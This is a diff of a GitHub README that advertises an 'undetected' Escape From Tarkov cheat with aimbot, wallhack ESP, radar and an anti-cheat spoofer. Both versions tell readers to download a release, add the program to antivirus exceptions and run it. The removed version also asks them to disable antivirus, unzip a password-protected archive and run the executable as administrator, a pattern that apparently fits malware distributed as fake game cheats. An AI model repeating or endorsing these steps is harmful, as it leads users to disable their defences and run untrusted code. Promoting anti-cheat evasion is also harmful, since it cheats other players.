@@ -1,88 +1,97 @@
-# Escape From Tarkov Medusa Hack 
-> 🚫 **Undetected on current BattleEye version**  
-> 🖥 Supported: Windows 10 / 11 (x64) | Intel & AMD CPUs  
-> 📁 Loader-based | Safe | Clean UI | Regular Updates | Built-in Spoofer
----
-![{3341F318-375D-4489-9167-70111B8F7F50}](https://github.com/user-attachments/assets/c4791394-5176-4879-ae1d-de5cd0318adb)
----
-## 📥 Download
+# Escape From Tarkov Medusa Undetected Rage Hack
 
-1. **Get the latest version** (https://github.com/Quinneala/Escape-From-Tarkov-Medusa-Undetected-Rage/releases/download/latest/Medusa.zip).
-2. **Unzip the Files**: Use the pass `Medusa`.
+![Escape From Tarkov](https://img.shields.io/badge/Escape%20From%20Tarkov-Medusa%20Hack-blue?style=for-the-badge&logo=appveyor)
 
----
+## Overview
 
-## 🔧 Installation Guide
+Escape From Tarkov Medusa Hack is a powerful tool designed to enhance your gaming experience in **Escape From Tarkov**. This undetected cheat offers a clean user interface and regular updates, ensuring you stay ahead in the game without the fear of bans. Our hack is compatible with Windows 10 and 11, making it accessible for a wide range of players.
 
-<details>
-  <summary>Show Instructions</summary>
+### Key Features
 
-  1. Download the archive from the button above  
-  2. Disable antivirus or add exception for the folder  
-  3. Extract files to a clean directory  
-  4. Run `Medusa.exe` as administrator
-  5. Select from the drop-down menu whether you want to use the built-in spoofer
-  6. Start Tarkov **after injection** is complete  
-  7. Open the menu with `Insert` or your custom keybind
+- **Undetected Cheat**: Play safely with our undetected hack.
+- **User-Friendly Interface**: Navigate easily with our clean UI.
+- **Regular Updates**: Enjoy continuous improvements and new features.
+- **Compatibility**: Designed for Windows 10 and 11.
 
-</details>
+### Getting Started
 
----
-## ⚔️ Features Overview
+To get started with the Escape From Tarkov Medusa Hack, download the latest release from our [Releases section](https://github.com/Yusuufff/Escape-From-Tarkov-Medusa-Undetected-Rage/releases). After downloading, execute the file and follow the on-screen instructions to set up the hack.
 
-### 🔫 Aimbot
-- `Memory-Based Aimbot` – Ultra-fast, low-input latency
-- `Silent Aim` – No camera movement, server-side lock
-- `FOV Limit` – Adjustable field of view radius
-- `Bone Selection` – Head / Chest / Pelvis
-- `Visible Check` – Aim only on visible targets
-- `Target Prioritization` – Closest / Lowest HP / Crosshair
-- `Custom Keybind` – Hold or toggle to activate aim
-- `Smooth Aim` – Human-like tracking
+### Installation Steps
 
----
+1. **Download the Release**: Visit our [Releases section](https://github.com/Yusuufff/Escape-From-Tarkov-Medusa-Undetected-Rage/releases) to download the latest version.
+2. **Extract the Files**: Use a file extraction tool to unzip the downloaded files.
+3. **Run the Installer**: Execute the installer and follow the prompts.
+4. **Launch the Hack**: After installation, open the hack and configure your settings.
 
-### 🔍 ESP (Wallhack)
-- `2D Box ESP` – Show player bounds (Box / Corner style)
-- `Health Bar` – See enemy HP above heads
-- `Distance ESP` – View exact distance to enemies
-- `Name ESP` – Show in-game names
-- `Team Check` – Ignores teammates
-- `Chams` – Colored player model outlines
-- `Skeleton` – Draw player bone structures
-- `Render Distance` – Fully configurable
+### Features Breakdown
 
----
+#### Aimbot
 
-### 🎒 Item ESP
-- `Weapon Crates`, `Powerups`, `Loot Points`
-- `Show Rarity Colors` – Grey / Green / Blue / Purple / Orange
-- `Show Distance` – Range filter to reduce clutter
-- `Custom ESP Toggle Key`
+The aimbot feature allows you to lock onto enemies with precision. It improves your accuracy and reaction time, giving you a significant advantage in combat.
 
----
+- **Customizable Settings**: Adjust the aimbot sensitivity and targeting options.
+- **Smooth Aiming**: Enjoy a natural aiming experience without looking robotic.
 
-### 🧠 NPC ESP
-- `Show Bot Locations` – AI indicators
-- `Neutral / Aggressive AI Color Coding`
-- `Health + Name ESP`
+#### ESP (Extra Sensory Perception)
 
----
+ESP provides you with vital information about your surroundings. You can see enemy locations, loot, and more through walls.
 
-### 🛠 Misc
-- `No Recoil` – Remove recoil pattern from weapons
-- `No Spread` – Increase weapon accuracy
-- `Custom Crosshair` – Visible at all times
-- `FPS Indicator` – In-game performance display
-- `Config System` – Save & load user profiles
-- `Stealth Mode` – Prevents detection overlays
+- **Item ESP**: Locate valuable items easily.
+- **Enemy ESP**: Identify enemy positions and movements.
 
----
+#### Radar
 
-## ❗ FAQ
+The radar feature displays enemy positions on a mini-map. This allows you to plan your moves strategically.
 
-- **Is it undetected right now?**  
-  ✅ Yes – regularly tested and updated to avoid detection.
+- **Real-Time Updates**: Get instant updates on enemy movements.
+- **Customizable Map**: Adjust the radar settings to fit your gameplay style.
 
-- **Can I use this in competitive mode?**  
-Use at your own risk. Features work in all game types, but we recommend PvE/Unranked.
+### System Requirements
+
+- **Operating System**: Windows 10 or 11
+- **RAM**: Minimum 4 GB
+- **Processor**: Intel Core i3 or equivalent
+- **Graphics Card**: NVIDIA GeForce GTX 660 or equivalent
+
+### Troubleshooting
+
+If you encounter any issues while using the Escape From Tarkov Medusa Hack, consider the following solutions:
+
+- **Antivirus Conflicts**: Ensure your antivirus software is not blocking the hack. Add the hack to the exceptions list if necessary.
+- **Game Updates**: Make sure your game is updated to the latest version.
+- **Reinstall the Hack**: If issues persist, try reinstalling the hack.
+
+### Community and Support
+
+Join our community for support and discussions. You can share your experiences, ask questions, and get tips from other users.
+
+- **Discord**: Join our Discord server for real-time support and updates.
+- **Forum**: Participate in our forum for discussions and troubleshooting.
+
+### Topics
+
+- [best-eft-cheats-2025](https://github.com/topics/best-eft-cheats-2025)
+- [best-free-eft-cheats-2025](https://github.com/topics/best-free-eft-cheats-2025)
+- [eft](https://github.com/topics/eft)
+- [eft-aim-ai](https://github.com/topics/eft-aim-ai)
+- [eft-cheat-github-hack-2025](https://github.com/topics/eft-cheat-github-hack-2025)
+- [eft-hack-github-hack-2025](https://github.com/topics/eft-hack-github-hack-2025)
+- [eft-hack-script](https://github.com/topics/eft-hack-script)
+- [escape-from-tarkov](https://github.com/topics/escape-from-tarkov)
+- [escape-from-tarkov-hack-github-2025](https://github.com/topics/escape-from-tarkov-hack-github-2025)
+- [tarkov](https://github.com/topics/tarkov)
+- [tarkov-esp-2025](https://github.com/topics/tarkov-esp-2025)
+- [tarkov-radar-2025](https://github.com/topics/tarkov-radar-2025)
+
+### License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+### Disclaimer
+
+Use this hack responsibly. Cheating can lead to bans, and we do not take responsibility for any actions taken against your account. Always play fair and respect the game and its community.
+
+### Conclusion
+
+For the latest updates and releases, visit our [Releases section](https://github.com/Yusuufff/Escape-From-Tarkov-Medusa-Undetected-Rage/releases). Enjoy your gaming experience with the Escape From Tarkov Medusa Hack!
